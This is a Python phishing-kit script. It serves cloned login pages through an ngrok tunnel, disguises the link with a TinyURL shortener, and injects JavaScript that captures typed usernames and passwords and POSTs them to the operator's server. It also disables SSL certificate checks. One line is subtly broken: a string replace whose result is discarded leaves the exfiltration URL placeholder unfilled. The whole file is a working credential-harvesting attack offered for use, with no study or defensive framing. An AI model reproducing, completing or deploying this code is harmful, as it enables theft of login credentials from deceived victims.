from http.server import HTTPServer, BaseHTTPRequestHandler
from pyngrok import ngrok
import sys
import pyshorteners
import ssl
import threading
import os

ssl._create_default_https_context = ssl._create_unverified_context
shortUrl = pyshorteners.Shortener()

def getArg(argDefiner):
    for index, arg in enumerate(sys.argv):
        if argDefiner == arg:
            return sys.argv[index + 1]

def launchServer():
    class requestHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def do_index(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open(path, "r", encoding="utf-8") as f:
                self.wfile.write(bytes(f.read(), "utf-8"))

        def do_script(self):
            self.send_response(200)
            self.send_header("Content-type", "application/javascript")
            self.end_headers()
            self.wfile.write(bytes(script, "utf-8"))

        def do_GET(self):
            if self.path == '/':
                self.do_index()
            elif self.path == '/script.js':
                self.do_script()

        def do_POST(self):
            content_len = int(self.headers.get('Content-Length'))
            post_body = self.rfile.read(content_len).decode()
            if len(post_body) <= 200:
                print("Received: " + post_body.removesuffix(", "))

    server = HTTPServer(("", 5000), requestHandler)
    server.serve_forever()

script = """
const url = "[PUBLIC_URL]"
document.querySelector("button[type=submit]").addEventListener("click", (e) => {
    e.preventDefault();
    let output = ""
    document.querySelectorAll("input").forEach(element => {
        if(element.type == "text" || element.type == "password") {
            if(!element.value == "") {
                const type = element.type.charAt(0).toUpperCase() + element.type.slice(1);
                output += `${type}: ${element.value}, `;
            }
        }
    });
    fetch(url, {
        method: "POST",
        body: output.replace("Text", "Username")
    })
});
"""

page = getArg("--page")
path = f"./website/{page}.html"
if page:
    if os.path.exists(path):
        print(f"Launching {page} phishing website...")
        public_url = ngrok.connect(5000).public_url
        script.replace("[PUBLIC_URL]", public_url)
        print("Webserver URL: " + shortUrl.tinyurl.short(public_url))
        threading.Thread(target=launchServer).start()
    else:
        print("Website is not available...")
        sys.exit()
else:
    websites = os.listdir("./website/")
    print("Currently available websites:")
    for website in websites:
        print("- " + website.replace(".html", ""))
    print("Run by doing: py phishing.py --page WEBSITENAME")